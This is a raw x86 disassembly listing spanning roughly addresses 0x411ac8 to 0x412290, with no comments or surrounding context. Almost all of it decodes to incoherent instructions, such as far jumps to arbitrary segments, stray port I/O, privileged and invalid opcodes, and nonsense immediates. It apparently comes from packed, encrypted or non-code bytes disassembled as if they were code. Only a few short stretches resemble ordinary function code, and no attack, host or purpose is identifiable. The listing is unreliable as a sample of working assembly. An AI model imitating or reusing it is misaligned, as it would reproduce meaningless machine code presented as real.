  411ac8:	cwde   
  411ac9:	cwde   
  411aca:	sub    al,0x84
  411acc:	add    DWORD PTR cs:[ebx+0x41c1f8ea],0xfffffff1
  411ad4:	arpl   WORD PTR [esi-0x11],bp
  411ad7:	adc    esp,ecx
  411ad9:	retf   0x165f
  411adc:	rol    DWORD PTR [ecx+0x12],1
  411adf:	push   esp
  411ae0:	pushf  
  411ae1:	sub    cl,BYTE PTR [ebx-0xb9e32a3]
  411ae7:	dec    edx
  411ae8:	sahf   
  411ae9:	lock adc al,0x74
  411aec:	fild   WORD PTR [ecx]
  411aee:	mov    edi,DWORD PTR [edx+esi*2-0x373c7cd7]
  411af5:	pop    esi
  411af6:	push   esp
  411af7:	push   edi
  411af8:	jmp    0x5fdd:0x6bb2118f
  411aff:	cld    
  411b00:	loop   0x411b3e
  411b02:	test   eax,0x4f4bd062
  411b07:	mov    bh,0xe4
  411b09:	lods   al,BYTE PTR ds:[esi]
  411b0a:	dec    ebx
  411b0b:	lods   eax,DWORD PTR ds:[esi]
  411b0c:	push   0xa1bc0b3b
  411b11:	mov    cl,0x77
  411b13:	and    BYTE PTR [ebp+0x79a6f654],ah
  411b19:	in     al,0xe5
  411b1b:	jmp    0x411aab
  411b1d:	pop    ecx
  411b1e:	cmp    DWORD PTR [edx+0x43dfd49],0xffffffde
  411b25:	call   0x84a05470
  411b2a:	fs jae 0x411b60
  411b2d:	push   ebp
  411b2e:	pushf  
  411b2f:	mov    esi,0xdff3cae0
  411b34:	push   esi
  411b35:	xchg   DWORD PTR [ecx],esi
  411b37:	xlat   BYTE PTR ds:[ebx]
  411b38:	sub    BYTE PTR [ebx-0x36],cl
  411b3b:	in     al,dx
  411b3c:	out    0x80,al
  411b3e:	jmp    0x5675:0x92d13a47
  411b45:	jbe    0x411b0c
  411b47:	mov    esp,0xe75a2adf
  411b4c:	add    ecx,DWORD PTR [ebp+0x6]
  411b4f:	sbb    eax,0x2041f28b
  411b54:	mov    BYTE PTR [eax],cl
  411b56:	inc    esi
  411b57:	xchg   edi,eax
  411b58:	idiv   BYTE PTR [edi+0x53]
  411b5b:	push   es
  411b5c:	xor    al,0xf5
  411b5e:	jne    0x411b5a
  411b60:	rcl    BYTE PTR [esi+edi*2+0x2f],1
  411b64:	or     BYTE PTR [edi+eax*2],0x10
  411b68:	cmp    ebx,ebx
  411b6a:	es push esi
  411b6c:	test   DWORD PTR [esi+edx*2+0x7e122fae],edi
  411b73:	sbb    esi,DWORD PTR [edx]
  411b75:	jae    0x411b04
  411b77:	jge    0x411b89
  411b79:	sbb    BYTE PTR [ebx-0x45],cl
  411b7c:	ficom  WORD PTR [ebp+eax*1-0x34addc1b]
  411b83:	in     al,dx
  411b84:	xchg   ebp,eax
  411b85:	and    DWORD PTR [ebx+0x61],eax
  411b88:	ds ret 
  411b8a:	fstp   QWORD PTR [esi]
  411b8c:	xchg   edx,eax
  411b8d:	inc    edi
  411b8e:	sti    
  411b8f:	adc    eax,0x292e7da5
  411b94:	std    
  411b95:	clc    
  411b96:	jmp    0xfbc548f1
  411b9b:	data16 shl BYTE PTR [edi+edi*2+0x54],1
  411ba0:	xchg   ecx,eax
  411ba1:	cmp    DWORD PTR [eax],ebp
  411ba3:	sub    ah,BYTE PTR [ecx]
  411ba5:	xchg   edi,eax
  411ba6:	stos   DWORD PTR es:[edi],eax
  411ba7:	ja     0x411b57
  411ba9:	stc    
  411baa:	sub    eax,0x4a84adf
  411baf:	cmp    sp,WORD PTR [ebp-0x18]
  411bb3:	push   edx
  411bb4:	or     ecx,ebp
  411bb6:	or     BYTE PTR [eax+0x55],cl
  411bb9:	push   cs
  411bba:	je     0x411c12
  411bbc:	push   edx
  411bbd:	inc    esp
  411bbe:	sbb    edx,DWORD PTR [esi+0x6639edbb]
  411bc4:	xor    DWORD PTR [ebp+0x365dd3bb],ecx
  411bca:	mov    ah,0xd4
  411bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bce:	xchg   edx,eax
  411bcf:	mov    BYTE PTR [ecx],bl
  411bd1:	aas    
  411bd2:	dec    ebx
  411bd3:	cmp    ch,al
  411bd5:	int    0x9e
  411bd7:	jae    0x411c30
  411bd9:	mov    ch,dh
  411bdb:	(bad)  
  411bdc:	test   al,0x72
  411bde:	retf   0xd34a
  411be1:	test   al,0x57
  411be3:	xor    dh,dl
  411be5:	and    al,0xf
  411be7:	clc    
  411be8:	call   0xd8ba:0xa3e32ba2
  411bef:	shr    BYTE PTR [eax],0xec
  411bf2:	cmp    eax,0xd7a8acb
  411bf7:	push   ecx
  411bf8:	int    0xdb
  411bfa:	mov    dh,0x5f
  411bfc:	pop    ebp
  411bfd:	sub    eax,0x6ac5d7c5
  411c02:	fsubr  QWORD PTR [esi+0x44]
  411c05:	call   0xbaa29a08
  411c0a:	pop    edx
  411c0b:	sub    eax,0xcdebf51e
  411c10:	push   ebp
  411c11:	mov    al,ds:0xb4fe5e1a
  411c16:	mov    DWORD PTR [edi+ebp*4],edi
  411c19:	arpl   di,dx
  411c1b:	(bad)  
  411c1c:	adc    DWORD PTR [ecx-0x55570b1e],esi
  411c22:	outs   dx,DWORD PTR ds:[esi]
  411c23:	jg     0x411bbc
  411c25:	inc    edi
  411c26:	arpl   WORD PTR [edx+edi*2+0x155452bd],si
  411c2d:	or     al,0xca
  411c2f:	int    0x40
  411c31:	leave  
  411c32:	bound  eax,QWORD PTR [ecx]
  411c34:	and    eax,0x4a6e7c11
  411c39:	inc    esp
  411c3a:	sub    eax,0xa43d78b6
  411c3f:	mov    esp,0xa820fcbe
  411c44:	xor    BYTE PTR [ebp+0x18],bh
  411c47:	jns    0x411c5c
  411c49:	popa   
  411c4a:	and    eax,0xb335c556
  411c4f:	hlt    
  411c50:	jns    0x411c73
  411c52:	or     eax,0x17e24f6e
  411c57:	icebp  
  411c58:	sub    al,0x1a
  411c5a:	jbe    0x411bdd
  411c5c:	ins    BYTE PTR es:[edi],dx
  411c5d:	outs   dx,DWORD PTR ds:[esi]
  411c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c5f:	je     0x411c1a
  411c61:	in     al,0x82
  411c63:	jnp    0x411c97
  411c65:	(bad)  
  411c67:	(bad)  
  411c68:	retf   
  411c69:	retf   0x4671
  411c6c:	jae    0x411cde
  411c6e:	xor    DWORD PTR gs:[ebx],eax
  411c71:	inc    ebx
  411c72:	sbb    esp,DWORD PTR [ecx]
  411c74:	mov    ds:0xbf3ace2e,eax
  411c79:	dec    ebx
  411c7a:	mov    edi,0x1e72306c
  411c7f:	idiv   BYTE PTR [ecx+edx*1]
  411c82:	call   0x29ea3a2f
  411c87:	sbb    eax,0xe5d8e673
  411c8c:	(bad)  
  411c8d:	or     BYTE PTR fs:[ecx],ch
  411c90:	out    0x63,eax
  411c92:	push   ebp
  411c93:	lock test BYTE PTR [ebp-0x5d],ah
  411c97:	jbe    0x411c60
  411c99:	adc    ch,bl
  411c9b:	test   eax,0x6208e2be
  411ca0:	dec    ebp
  411ca1:	lahf   
  411ca2:	aam    0x20
  411ca4:	(bad)  
  411ca5:	(bad)  
  411ca6:	(bad)  
  411ca8:	jmp    0x77d7:0x759a3d
  411caf:	idiv   DWORD PTR [edi-0x7150e9fc]
  411cb5:	and    al,BYTE PTR [ecx-0x2ebdf76c]
  411cbb:	jg     0x411ca6
  411cbd:	loope  0x411c4f
  411cbf:	pusha  
  411cc0:	inc    ebx
  411cc1:	push   ecx
  411cc2:	jmp    0xe060:0xc9a37a26
  411cc9:	jg     0x411d2c
  411ccb:	ret    0x77e0
  411cce:	icebp  
  411ccf:	lock pop ebx
  411cd1:	sub    edi,DWORD PTR [edi]
  411cd3:	(bad)  
  411cd4:	xchg   ecx,eax
  411cd5:	cli    
  411cd6:	add    ebx,DWORD PTR [edi+0x65f23567]
  411cdc:	inc    esi
  411cdd:	rcr    esi,1
  411cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce0:	adc    eax,0x590fa2b9
  411ce5:	jecxz  0x411d16
  411ce7:	jp     0x411cbd
  411ce9:	sub    edi,DWORD PTR [eax-0x57c40d12]
  411cef:	(bad)  [eax-0x6a]
  411cf2:	rcl    BYTE PTR [edi+ebp*4],cl
  411cf5:	mov    ecx,esp
  411cf7:	jbe    0x411cfb
  411cf9:	jb     0x411cad
  411cfb:	bound  edx,QWORD PTR [edi+0x79]
  411cfe:	inc    eax
  411cff:	jmp    0x540d:0x967bfcf
  411d06:	mov    eax,0x5677cc51
  411d0b:	adc    ebp,ebp
  411d0d:	push   DWORD PTR [esp+ebp*4-0x7f]
  411d11:	mov    esp,0x9e2b0929
  411d16:	mov    dh,0xe2
  411d18:	rcr    DWORD PTR [esi+0x71],1
  411d1b:	retf   0x96ae
  411d1e:	or     bl,BYTE PTR [eax-0x3385c3a2]
  411d24:	jbe    0x411d12
  411d26:	pop    dx
  411d28:	inc    eax
  411d29:	cmp    edi,ebx
  411d2b:	mov    DWORD PTR [ecx-0x39413888],0x9704a5da
  411d35:	stos   DWORD PTR es:[edi],eax
  411d36:	sub    esp,DWORD PTR [edi+eax*2+0x2e]
  411d3a:	sar    ch,1
  411d3c:	iret   
  411d3d:	pop    ds
  411d3e:	in     al,dx
  411d3f:	fnstenv [edi+0x17]
  411d42:	mov    ch,0x72
  411d44:	dec    eax
  411d45:	mov    ds:0x8e755051,eax
  411d4a:	pop    eax
  411d4b:	jmp    0x411d53
  411d4d:	fmulp  st(1),st
  411d4f:	jae    0x411d3c
  411d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d52:	imul   ecx,DWORD PTR [eax],0xc066b40d
  411d58:	aaa    
  411d59:	pushf  
  411d5a:	mov    bl,0x68
  411d5c:	nop
  411d5d:	test   eax,0x9d05e355
  411d62:	fcomp  DWORD PTR [esi+0x14]
  411d65:	mov    DWORD PTR [ecx-0x108e257a],eax
  411d6b:	fcmovu st,st(6)
  411d6d:	jnp    0x411da8
  411d6f:	mov    ch,0xfa
  411d71:	cmp    eax,0x8680aba7
  411d76:	pop    eax
  411d77:	mov    esi,DWORD PTR [ebx]
  411d79:	stos   DWORD PTR es:[edi],eax
  411d7a:	outs   dx,DWORD PTR cs:[esi]
  411d7c:	retf   0x9c97
  411d7f:	xor    DWORD PTR [ebx],esp
  411d81:	cli    
  411d82:	xor    ebp,edx
  411d84:	and    bh,cl
  411d86:	cld    
  411d87:	and    DWORD PTR [ebp-0x15],ebp
  411d8a:	adc    BYTE PTR [ebp+0x31],bl
  411d8d:	xor    DWORD PTR [ecx+0x3644dbc],eax
  411d93:	dec    edx
  411d94:	int    0x4e
  411d96:	test   BYTE PTR [edx-0x129bfa2d],0x3f
  411d9d:	jns    0x411df4
  411d9f:	pop    ss
  411da0:	test   al,0xe5
  411da2:	pop    ss
  411da3:	jge    0x411e1a
  411da5:	lods   al,BYTE PTR ds:[esi]
  411da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411da7:	std    
  411da8:	repnz dec esp
  411daa:	sub    al,cl
  411dac:	push   ds
  411dad:	sub    BYTE PTR [ebx-0x23b5d1f1],0x7b
  411db4:	adc    eax,0x1c236575
  411db9:	mov    WORD PTR [ecx-0x10ab65d9],gs
  411dbf:	int3   
  411dc0:	jg     0x411d6a
  411dc2:	sbb    cl,ah
  411dc4:	xor    eax,0xe03a7d64
  411dc9:	pop    es
  411dca:	dec    edx
  411dcb:	dec    ebp
  411dcc:	jno    0x411e15
  411dce:	jnp    0x411d81
  411dd0:	adc    bl,BYTE PTR [edi+0x77fe7ec3]
  411dd6:	fadd   st,st(2)
  411dd8:	jmp    0x411e22
  411dda:	out    dx,al
  411ddb:	not    BYTE PTR [ebx+0x463274cd]
  411de1:	dec    ebx
  411de2:	push   edx
  411de3:	pop    ebp
  411de4:	mul    BYTE PTR [edx+edx*8+0x75]
  411de8:	xor    cl,BYTE PTR [ebx-0x6021412b]
  411dee:	fs cmc 
  411df0:	test   al,0xb
  411df2:	fs pop eax
  411df4:	sub    al,BYTE PTR [eax+0x8]
  411df7:	push   0xffffff8d
  411df9:	data16 cmp dl,BYTE PTR [ecx+0x6efc415d]
  411e00:	or     ah,0x16
  411e03:	xlat   BYTE PTR ds:[ebx]
  411e04:	ins    DWORD PTR es:[edi],dx
  411e05:	ja     0x411dc2
  411e07:	push   edi
  411e08:	xor    eax,0x9f124bf
  411e0d:	inc    esp
  411e0e:	mov    cl,0xfc
  411e10:	dec    ebp
  411e11:	xor    al,0x51
  411e13:	out    0xf0,eax
  411e15:	js     0x411df1
  411e17:	js     0x411e18
  411e19:	fstp   DWORD PTR [eax-0x3db2295b]
  411e1f:	cwde   
  411e20:	xchg   ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	add    eax,0x10a5b184
  411e50:	dec    eax
  411e51:	jo     0x411ec3
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e2c
  411e58:	add    esi,ebp
  411e5a:	dec    eax
  411e5b:	xchg   edi,eax
  411e5c:	cdq    
  411e5d:	sub    DWORD PTR [ebp+0x1b],0x56
  411e61:	adc    DWORD PTR [edx-0x4e],0xfffffff7
  411e65:	call   0x74cf2bc4
  411e6a:	jmp    0xadaf:0xda10930a
  411e71:	lds    ebp,FWORD PTR [ebx-0x2d82b1e4]
  411e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e78:	push   ebp
  411e79:	out    0x22,al
  411e7b:	hlt    
  411e7c:	lock jl 0x411efd
  411e7f:	test   eax,0x5a12aa
  411e84:	es aam 0x50
  411e87:	mov    eax,0xebc8809b
  411e8c:	mov    ds:0xf025f589,al
  411e91:	xchg   edi,eax
  411e92:	popf   
  411e93:	xchg   esi,eax
  411e94:	in     al,dx
  411e95:	sub    BYTE PTR [edi],0x41
  411e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e99:	push   ebx
  411e9a:	fisubr DWORD PTR [edi]
  411e9c:	or     ah,dl
  411e9e:	ins    DWORD PTR es:[edi],dx
  411e9f:	mov    cl,0xfd
  411ea1:	ror    DWORD PTR [esi+edx*1+0x67],1
  411ea5:	test   eax,0xd8670988
  411eaa:	inc    esi
  411eab:	lds    eax,FWORD PTR [ebx-0x39]
  411eae:	gs jb  0x411e76
  411eb1:	les    edi,FWORD PTR ds:0xccfa1e13
  411eb7:	inc    ebp
  411eb8:	lock mov bl,0x84
  411ebb:	and    BYTE PTR [esi+0x7d],ch
  411ebe:	leave  
  411ebf:	add    DWORD PTR [eax],ebp
  411ec1:	mov    eax,ds:0xf04d9914
  411ec6:	sbb    eax,0x867e746d
  411ecb:	mov    ah,0xeb
  411ecd:	mov    ch,0x7b
  411ecf:	scas   al,BYTE PTR es:[edi]
  411ed0:	in     eax,0x78
  411ed2:	call   0x56c6a87c
  411ed7:	cdq    
  411ed8:	mov    ecx,0x48974cb6
  411edd:	pop    esp
  411ede:	adc    ebx,DWORD PTR [ebp+0x409c61ef]
  411ee4:	dec    esp
  411ee5:	push   edx
  411ee6:	adc    BYTE PTR [ebx+0x6c],dl
  411ee9:	mov    cl,0x9b
  411eeb:	nop
  411eec:	mov    esi,0x67d253a9
  411ef1:	xchg   ecx,eax
  411ef2:	out    0xdb,al
  411ef4:	iret   
  411ef5:	out    dx,eax
  411ef6:	imul   esi,DWORD PTR es:[edi+0x6f22e4d9],0x74f90421
  411f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f02:	cwde   
  411f03:	inc    eax
  411f04:	xor    al,0x45
  411f06:	xchg   DWORD PTR [ebx+edi*2+0x7f1b585d],edx
  411f0d:	leave  
  411f0e:	jbe    0x411f5f
  411f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f11:	ins    BYTE PTR es:[edi],dx
  411f12:	add    DWORD PTR [edi+0x70],ebp
  411f15:	iret   
  411f16:	pop    edx
  411f17:	in     eax,0xe9
  411f19:	arpl   cx,si
  411f1b:	lds    esp,FWORD PTR [ecx+ecx*8]
  411f1e:	and    BYTE PTR [ebp+0x13],ch
  411f21:	out    0xb3,al
  411f23:	mov    al,BYTE PTR [ecx-0x64]
  411f26:	or     BYTE PTR ds:0x128945bb,cl
  411f2c:	and    eax,0x8cdc3f1e
  411f31:	jno    0x411f3d
  411f33:	mov    bh,0x36
  411f35:	mov    esp,0x55b696a3
  411f3a:	mov    dh,ch
  411f3c:	dec    ebx
  411f3d:	shl    esi,1
  411f3f:	ds shl edx,cl
  411f42:	mov    al,0xe3
  411f44:	shl    DWORD PTR [eax+0x5b],1
  411f47:	push   esi
  411f48:	outs   dx,BYTE PTR ds:[esi]
  411f49:	dec    eax
  411f4a:	ins    BYTE PTR es:[edi],dx
  411f4b:	mov    ch,0x2b
  411f4d:	mov    ecx,0xf115aac8
  411f52:	or     DWORD PTR [ebp+0x74],edx
  411f55:	clc    
  411f56:	mov    ch,dh
  411f58:	test   al,0x84
  411f5a:	or     al,0x71
  411f5c:	call   DWORD PTR [edx-0x4593d411]
  411f62:	inc    eax
  411f63:	jns    0x411fa6
  411f65:	ins    DWORD PTR es:[edi],dx
  411f66:	call   0x594bc9c3
  411f6b:	xor    DWORD PTR [esi-0x17],edx
  411f6e:	retf   0xc2ce
  411f71:	mov    ds:0x421eb040,eax
  411f76:	or     DWORD PTR [esi],edx
  411f78:	xor    edi,esp
  411f7a:	test   DWORD PTR [eax],esp
  411f7c:	lahf   
  411f7d:	xchg   esp,eax
  411f7e:	outs   dx,DWORD PTR ds:[esi]
  411f7f:	pop    esp
  411f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f81:	adc    BYTE PTR [ecx+0x47],bh
  411f84:	add    bl,BYTE PTR [eax-0x1dbd0ad8]
  411f8a:	clc    
  411f8b:	ror    BYTE PTR ds:0xbc2b5097,0xa4
  411f92:	icebp  
  411f93:	pop    esi
  411f94:	inc    ecx
  411f95:	or     esi,DWORD PTR [edi]
  411f97:	(bad)  
  411f98:	mov    bl,0x2d
  411f9a:	outs   dx,DWORD PTR ds:[esi]
  411f9b:	mov    dh,0xbc
  411f9d:	mov    al,0x33
  411f9f:	(bad)  
  411fa0:	jmp    0x976:0xc2f188e4
  411fa7:	sub    BYTE PTR [edx+ecx*1],al
  411faa:	scas   eax,DWORD PTR es:[edi]
  411fab:	inc    esp
  411fac:	xchg   esi,eax
  411fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fae:	mov    dh,0x19
  411fb0:	dec    edx
  411fb1:	sahf   
  411fb2:	mov    al,ds:0x40650827
  411fb7:	pop    ss
  411fb8:	xor    dh,BYTE PTR [eax+0x3691e9ba]
  411fbe:	fadd   DWORD PTR [esp+eax*8]
  411fc1:	scas   eax,DWORD PTR es:[edi]
  411fc2:	jne    0x411f7f
  411fc4:	or     eax,0x9b6cb358
  411fc9:	add    BYTE PTR [edx-0x5ec1e557],0x50
  411fd0:	(bad)  
  411fd1:	fadd   DWORD PTR ds:0xc98c37ee
  411fd7:	xchg   ebx,eax
  411fd8:	or     dl,0xa
  411fdb:	cmp    al,0x8d
  411fdd:	imul   esp,DWORD PTR cs:[ecx],0x29
  411fe1:	xchg   esi,eax
  411fe2:	pop    esp
  411fe3:	and    al,0x51
  411fe5:	mov    edx,0xe0174ba2
  411fea:	ins    DWORD PTR es:[edi],dx
  411feb:	and    eax,0x47fbb6ad
  411ff0:	fild   QWORD PTR [ecx+0x4e]
  411ff3:	(bad)  
  411ff4:	xlat   BYTE PTR ds:[ebx]
  411ff5:	pop    esi
  411ff6:	xchg   DWORD PTR [ebx-0x56],edx
  411ff9:	js     0x411fbc
  411ffb:	loopne 0x411fd4
  411ffd:	xor    BYTE PTR [ebx],dh
  411fff:	mov    ds:0x23e0570c,al
  412004:	aaa    
  412005:	test   BYTE PTR [eax+edi*2+0x30cd3356],ch
  41200c:	mov    cl,0x7f
  41200e:	ficomp DWORD PTR [ecx+0x47]
  412011:	rcr    BYTE PTR [edx+0x58],0x67
  412015:	dec    eax
  412016:	dec    edx
  412017:	lock (bad) 
  412019:	(bad)  
  41201a:	fld    DWORD PTR [ecx+0xe4a6b2c]
  412020:	rcl    DWORD PTR [edx-0x181c79bb],0xa6
  412027:	fild   DWORD PTR fs:[ebx-0x33]
  41202b:	fcomp  st(3)
  41202d:	sub    al,0x22
  41202f:	(bad)  
  412031:	push   cs
  412032:	xor    eax,0xdd1bbb74
  412037:	or     edi,DWORD PTR [ebp+0x65793499]
  41203d:	cmp    DWORD PTR [eax+0x20],ebp
  412040:	pop    es
  412041:	push   ds
  412042:	add    bl,BYTE PTR [eax-0x2c]
  412045:	dec    edx
  412046:	dec    eax
  412047:	inc    ebp
  412048:	add    DWORD PTR [edi-0x62880b24],0x3d3964c9
  412052:	outs   dx,DWORD PTR ds:[esi]
  412053:	mov    bl,0x15
  412055:	jbe    0x412034
  412057:	push   ebx
  412058:	pop    esi
  412059:	pop    edx
  41205a:	loop   0x412072
  41205c:	aam    0xc3
  41205e:	hlt    
  41205f:	mov    eax,0xfd9f313d
  412064:	xchg   edi,eax
  412065:	mov    ah,0x55
  412067:	cmp    eax,0x8fb6a03d
  41206c:	or     edx,edi
  41206e:	sbb    bh,BYTE PTR [esi+0x39]
  412071:	and    edi,ecx
  412073:	sbb    al,0x91
  412075:	add    al,0xbc
  412077:	(bad)  
  412079:	push   esi
  41207a:	add    ah,bl
  41207c:	cmp    ecx,DWORD PTR [ebx+0x213abb82]
  412082:	sbb    DWORD PTR [edi-0x214c1e6c],ebp
  412088:	fistp  QWORD PTR [edi+0x14f07a39]
  41208e:	les    eax,FWORD PTR [eax]
  412090:	mov    eax,ds:0x9fe3f6a5
  412095:	fcmovne st,st(3)
  412097:	sahf   
  412098:	xchg   esp,eax
  412099:	mov    esp,DWORD PTR [esi]
  41209b:	pusha  
  41209c:	es jle 0x41207d
  41209f:	xchg   esp,eax
  4120a0:	and    BYTE PTR es:[ecx+eiz*8-0x6fe1ec8c],ch
  4120a8:	les    esi,FWORD PTR [edi+0x47]
  4120ab:	data16 adc al,0xb0
  4120ae:	or     DWORD PTR [edi-0x6d],0xcc4b8f6
  4120b5:	es jae 0x4120c9
  4120b8:	jns    0x412134
  4120ba:	fist   DWORD PTR [esi+0x33]
  4120bd:	fnstenv [esi+0x5c7c9528]
  4120c3:	int    0x39
  4120c5:	jne    0x4120e2
  4120c7:	aad    0x1c
  4120c9:	mov    ah,0x66
  4120cb:	cmp    ebp,DWORD PTR [edx]
  4120cd:	jns    0x412099
  4120cf:	mov    bl,0x76
  4120d1:	pop    edx
  4120d2:	adc    eax,0x3a7c4569
  4120d7:	call   DWORD PTR [eiz*8+0xa9934eb]
  4120de:	add    bl,BYTE PTR [esi*2+0x51d34c8e]
  4120e5:	dec    ebp
  4120e6:	js     0x412092
  4120e8:	push   esi
  4120e9:	mov    cs,WORD PTR [esi]
  4120eb:	inc    esp
  4120ec:	je     0x41214b
  4120ee:	pop    ss
  4120ef:	cld    
  4120f0:	lds    edi,FWORD PTR [edx+0x1b008e16]
  4120f6:	push   esi
  4120f7:	inc    edx
  4120f8:	xor    esi,DWORD PTR [edi+ebp*2]
  4120fb:	jbe    0x412147
  4120fd:	pushf  
  4120fe:	sti    
  4120ff:	pop    edx
  412100:	shl    BYTE PTR [edx+0xc],cl
  412103:	push   ds
  412104:	or     al,0xe9
  412106:	sbb    DWORD PTR [eax-0x23],ebx
  412109:	pop    ebp
  41210a:	test   ebx,edx
  41210c:	or     ebp,esp
  41210e:	test   BYTE PTR [ecx+eiz*4+0x5945eb95],ch
  412115:	inc    eax
  412116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412117:	and    al,0xa7
  412119:	pop    ss
  41211a:	adc    al,0xf2
  41211c:	(bad)  
  41211d:	(bad)  
  41211e:	push   edi
  41211f:	repz out 0x7,al
  412122:	adc    bh,bh
  412124:	pop    ebx
  412125:	jns    0x4120f4
  412127:	push   edi
  412128:	stc    
  412129:	imul   ebp,DWORD PTR [esi],0xbb8e94ab
  41212f:	cmp    eax,0x4c960d7a
  412134:	mov    al,ds:0x4af763b9
  412139:	retf   0x596d
  41213c:	jge    0x41212c
  41213e:	push   ebx
  41213f:	retf   
  412140:	cld    
  412141:	mov    al,ds:0xa54772cc
  412146:	xor    BYTE PTR [edi-0x2a],0xe7
  41214a:	(bad)
  41214e:	repz cmp DWORD PTR [ebx],edx
  412151:	push   ss
  412152:	sbb    ecx,DWORD PTR [edi-0x56]
  412155:	or     BYTE PTR [edx],bl
  412157:	rcr    dh,0x55
  41215a:	mov    al,al
  41215c:	repz add eax,0x46c2bb52
  412162:	jge    0x412101
  412164:	sub    bl,BYTE PTR [edi+0x195ded36]
  41216a:	mov    esp,es
  41216c:	mov    BYTE PTR [esi-0x70],ch
  41216f:	sbb    BYTE PTR [eax],al
  412171:	out    0xed,eax
  412173:	xchg   DWORD PTR [eax+0x25],esi
  412176:	push   edx
  412177:	stos   DWORD PTR es:[edi],eax
  412178:	out    dx,eax
  412179:	xlat   BYTE PTR ds:[ebx]
  41217a:	pop    ds
  41217b:	ret    
  41217c:	sub    esp,DWORD PTR [ecx]
  41217e:	or     DWORD PTR [eax+0x1b],edx
  412181:	outs   dx,DWORD PTR ds:[esi]
  412182:	imul   BYTE PTR [ebp+0x7bda7d07]
  412188:	repz sbb DWORD PTR [ebp-0x55804025],esp
  41218f:	cmp    eax,0x138c4285
  412194:	and    eax,DWORD PTR [esi]
  412196:	and    DWORD PTR [eax+0x3940fe16],ecx
  41219c:	dec    ebx
  41219d:	stc    
  41219e:	adc    cl,BYTE PTR [esi+0x4]
  4121a1:	xor    eax,0x6346e85f
  4121a6:	in     eax,0x1
  4121a8:	std    
  4121a9:	sbb    BYTE PTR ss:0x15548a54,bh
  4121b0:	add    eax,0x8e457fd2
  4121b5:	dec    ecx
  4121b6:	inc    ebp
  4121b7:	mov    al,ds:0x29fed6e7
  4121bc:	lds    ecx,FWORD PTR [edx]
  4121be:	pop    es
  4121bf:	mov    BYTE PTR [eax+eax*2-0x7b],ah
  4121c3:	xor    esi,0xffffffa4
  4121c6:	jg     0x4121cb
  4121c8:	ret    0xc786
  4121cb:	and    dh,BYTE PTR [eax]
  4121cd:	dec    ebx
  4121ce:	(bad)  
  4121cf:	das    
  4121d0:	inc    edx
  4121d1:	xor    ecx,0x4b
  4121d4:	dec    eax
  4121d5:	mov    BYTE PTR [esi+0xcd2d2e9],ah
  4121db:	jmp    0xec0f:0x19c23922
  4121e2:	lahf   
  4121e3:	push   edx
  4121e4:	outs   dx,BYTE PTR ds:[esi]
  4121e5:	push   ebx
  4121e6:	xchg   esi,eax
  4121e7:	fsubrp st(3),st
  4121e9:	fadd   st(4),st
  4121eb:	retf   
  4121ec:	and    DWORD PTR [ebx],eax
  4121ee:	dec    ebp
  4121ef:	adc    al,0x68
  4121f1:	int    0x3f
  4121f3:	call   0x3531dc25
  4121f8:	push   ss
  4121f9:	adc    esi,DWORD PTR [ebx]
  4121fb:	pushf  
  4121fc:	or     al,0x68
  4121fe:	jo     0x41225d
  412200:	lea    eax,[esi-0x423d2376]
  412206:	xor    DWORD PTR [edi+0x5a],esi
  412209:	adc    BYTE PTR [edi+esi*8],bh
  41220c:	fisttp WORD PTR [edx+0x2861e24b]
  412212:	pop    ebx
  412213:	jmp    0x2159:0xb26c770b
  41221a:	stos   BYTE PTR es:[edi],al
  41221b:	call   0x192104bf
  412220:	or     ah,BYTE PTR [eax+ebp*2-0x2eea5eb5]
  412227:	push   ebx
  412228:	cmp    DWORD PTR [esi-0xb1317a1],esi
  41222e:	dec    ebx
  41222f:	xor    edx,edx
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
